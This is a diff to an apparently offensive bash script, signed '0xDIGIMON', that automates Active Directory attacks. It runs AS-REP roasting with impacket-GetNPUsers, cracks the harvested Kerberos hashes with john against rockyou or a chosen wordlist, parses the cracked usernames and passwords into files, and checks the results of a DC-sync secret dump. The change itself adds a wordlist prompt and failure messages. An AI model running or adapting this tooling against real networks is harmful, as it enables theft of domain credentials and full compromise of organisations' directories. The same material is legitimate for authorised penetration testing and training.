@@ -215,17 +215,54 @@ then
         fi
         impacket-GetNPUsers -user users.txt  -dc-ip $ip $domain/ >> tgt
         cat tgt | grep "\$krb5asrep" > tgt.hash
-        john --wordlist=/usr/share/wordlists/rockyou.txt tgt.hash > pass.txt 
-        cat pass.txt | grep "\$k" > tgtpassords.txt
-        cat tgtpassords.txt | sort -u > tgtpasswords.txt
-        rm tgt pass.txt tgtpassords.txt
-        cat tgtpasswords.txt | cut -d " " -f 1 > passwordmon.txt
-        cat tgtpasswords.txt | cut -d "$" -f 4 | cut -d "@" -f 1 > usermon.txt
+        #
+        #
+        read -p $'\e[32mStart crack tgt hash Attack\nDo you want continue using rockyou wordlist or add other wordlist [[R]ockyou/[A]dd] \e[0m' -n 1;
+        echo
+            if [[($REPLY =~ ^[Aa]$)]]
+            #
+            #
+            then
+                printf '\e[1;34m%-6s\e[m' "Add path of word list "
+                read -r word
+                #word="/usr/share/wordlists/rockyou.txt"
+                if [[(`ls -1 $word 2>/dev/null | wc -l ` -gt 0 )]]
+                then
+                john --wordlist=$word tgt.hash > pass.txt 
+                cat pass.txt | grep "\$k" > tgtpassords.txt
+                cat tgtpassords.txt | sort -u > tgtpasswords.txt
+                rm tgt pass.txt tgtpassords.txt
+                cat tgtpasswords.txt | cut -d " " -f 1 > passwordmon.txt
+                cat tgtpasswords.txt | cut -d "$" -f 4 | cut -d "@" -f 1 > usermon.txt
+                else
+                echo -e "${BOLDRED}Path not Found Start crack with rockyou${END}"
+                word=/usr/share/wordlists/rockyou.txt
+                    if [[(`ls -1 $word 2>/dev/null | wc -l ` -gt 0 )]]
+                        then
+                        john --wordlist=$word tgt.hash > pass.txt 
+                        cat pass.txt | grep "\$k" > tgtpassords.txt
+                        cat tgtpassords.txt | sort -u > tgtpasswords.txt
+                        rm tgt pass.txt tgtpassords.txt
+                        cat tgtpasswords.txt | cut -d " " -f 1 > passwordmon.txt
+                        cat tgtpasswords.txt | cut -d "$" -f 4 | cut -d "@" -f 1 > usermon.txt
+                        else
+                        echo -e "\n${BOLDRED}rockyou not Found${END}"
+                    fi
+                fi
+            else
+            john --wordlist=/usr/share/wordlists/rockyou.txt tgt.hash > pass.txt 
+            cat pass.txt | grep "\$k" > tgtpassords.txt
+            cat tgtpassords.txt | sort -u > tgtpasswords.txt
+            rm tgt pass.txt tgtpassords.txt
+            cat tgtpasswords.txt | cut -d " " -f 1 > passwordmon.txt
+            cat tgtpasswords.txt | cut -d "$" -f 4 | cut -d "@" -f 1 > usermon.txt
+            fi
 
         if [[($(wc -l < passwordmon.txt) -le 1 && $(wc -l < usermon.txt) -le 1)]]
         then
         echo -e "${BOLDRED}Failed AS-REP-Roasting Attack${END}"
-        rm usermon.txt passwordmon.txt tgt.hash tgtpasswords.txt
+        rm usermon.txt passwordmon.txt tgtpasswords.txt
+        echo -e "${BOLDRED}maybe it's Failed to crack tgt hash!\nTry to crack the tgt.hash manually${END}"
         fi
         #
         #
@@ -348,6 +385,13 @@ then
                     rm usermon.txt passwordmon.txt
                     exit 1;
                     fi
+                    if [[(`ls -1 *.secretDump 2>/dev/null | wc -l ` -gt 0 )]]
+                    then
+                    echo -e "${BOLDRED}Bye!\n0xDIGIMON${END}"
+                    else
+                    echo -e "${BOLDRED}Feild dc-sync Attack${END}"
+                    echo -e "${BOLDRED}Bye!\n0xDIGIMON${END}"
+                    fi
                 fi
             else
                 if [[(-n "$username" && -n "$password" && -n "$domain" && -n "$ip")]]
@@ -374,6 +418,7 @@ then
                             if [[($(wc -l < $username.secretDump) -le 10)]]
                             then
                             rm $username.secretDump
+                            echo -e "${BOLDRED}Failed dc-sync Attack${END}"
                             fi
                         fi
                         echo -e "${BOLDRED}Bye!\n0xDIGIMON${END}"
